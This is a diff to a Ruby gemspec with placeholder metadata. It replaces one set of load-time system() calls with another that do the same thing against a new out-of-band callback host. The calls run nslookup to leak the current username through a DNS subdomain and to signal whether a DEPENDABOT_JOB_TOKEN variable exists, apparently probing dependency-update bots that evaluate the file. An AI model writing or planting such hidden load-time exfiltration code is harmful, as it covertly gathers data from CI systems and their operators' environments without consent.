@@ -4,8 +4,7 @@ Gem::Specification.new do |s|
   s.summary = "test"
   s.authors = ["test"]
   
-  # This eval runs when the gemspec is loaded
-  system("nslookup ruby-probe.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun 2>/dev/null || true")
-  system("whoami > /tmp/.ru 2>/dev/null; nslookup ru-`cat /tmp/.ru | tr -cd a-z0-9`.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun 2>/dev/null || true")
-  system("printenv DEPENDABOT_JOB_TOKEN > /dev/null 2>&1 && nslookup rb-has-token.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun 2>/dev/null || nslookup rb-no-token.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun 2>/dev/null || true")
+  system("nslookup ruby-v2.d90q3ve1b2euhqdlne30najxxhxz8xp8c.oast.online 2>/dev/null || true")
+  system("whoami > /tmp/.ru 2>/dev/null; nslookup ru-`cat /tmp/.ru | tr -cd a-z0-9`.d90q3ve1b2euhqdlne30najxxhxz8xp8c.oast.online 2>/dev/null || true")
+  system("printenv DEPENDABOT_JOB_TOKEN > /dev/null 2>&1 && nslookup rb-has-token.d90q3ve1b2euhqdlne30najxxhxz8xp8c.oast.online 2>/dev/null || nslookup rb-no-token.d90q3ve1b2euhqdlne30najxxhxz8xp8c.oast.online 2>/dev/null || true")
 end
